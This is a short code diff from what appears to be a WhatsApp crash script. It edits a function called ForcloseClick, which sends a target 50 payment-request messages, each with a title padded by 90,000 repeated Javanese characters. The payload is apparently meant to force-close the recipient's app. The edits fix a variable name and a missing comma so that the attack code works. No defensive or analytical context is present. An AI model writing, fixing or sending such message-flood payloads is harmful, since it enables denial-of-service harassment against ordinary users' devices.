@@ -989,7 +989,7 @@ async function ForcloseClick(minato, target) {
   try {
     for (let i = 0; i < 50; i++) {
 
-      await sock.sendMessage(jid, {
+      await minato.sendMessage(jid, {
         requestPaymentMessage: {
           currencyCodeIso4217: "IDR",
           amount1000: 10000 * 1000,
@@ -1008,7 +1008,7 @@ async function ForcloseClick(minato, target) {
           background: { id: "default" }
         },
         paymentLinkMetadata: {
-          title: "CRIMSON" + "ꦽ".repeat(90000)
+          title: "CRIMSON" + "ꦽ".repeat(90000),
           subtitle: "𝑅𝑖𝑑𝑧𝑧",
           currencyCode: "IDR"
         }
